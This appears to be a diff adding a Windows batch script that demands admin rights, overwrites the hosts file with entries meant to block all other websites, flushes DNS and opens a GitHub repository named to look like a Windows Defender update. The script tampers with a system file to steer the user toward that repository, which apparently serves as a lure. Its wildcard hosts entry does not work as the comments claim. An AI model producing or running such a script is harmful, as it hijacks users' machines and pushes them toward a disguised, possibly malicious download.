@@ -1,0 +1,47 @@
+@echo off
+REM Script to redirect traffic to a specific GitHub repository by modifying the hosts file
+REM This will block other websites and force open the target URL in the default browser
+
+REM Check if script is running with admin privileges
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo This script requires administrative privileges to run.
+    echo Please right-click the script and select "Run as Administrator".
+    pause
+    exit /b
+)
+
+REM Define the target URL
+set TARGET_URL=https://github.com/bullydog4ever40-ai/windows-defender-updated-.git
+
+REM Path to the hosts file
+set HOSTS_FILE=%SystemRoot%\System32\drivers\etc\hosts
+
+REM Backup the original hosts file
+if exist %HOSTS_FILE%.backup (
+    echo Backup of hosts file already exists.
+) else (
+    copy %HOSTS_FILE% %HOSTS_FILE%.backup
+    echo Backup of hosts file created.
+)
+
+REM Clear the existing hosts file content and redirect all traffic to 127.0.0.1 (localhost)
+echo # Redirecting all traffic to localhost > %HOSTS_FILE%
+echo 127.0.0.1 localhost >> %HOSTS_FILE%
+echo # Block all other domains by redirecting to localhost >> %HOSTS_FILE%
+echo 127.0.0.1 * >> %HOSTS_FILE%
+
+REM Flush DNS cache to apply changes
+ipconfig /flushdns
+echo DNS cache flushed.
+
+REM Open the target URL in the default browser
+start "" %TARGET_URL%
+
+REM Notify user
+echo All other websites have been blocked.
+echo The target URL (%TARGET_URL%) has been opened in your default browser.
+echo To restore original settings, replace the hosts file with the backup (%HOSTS_FILE%.backup).
+
+pause
+exit /b
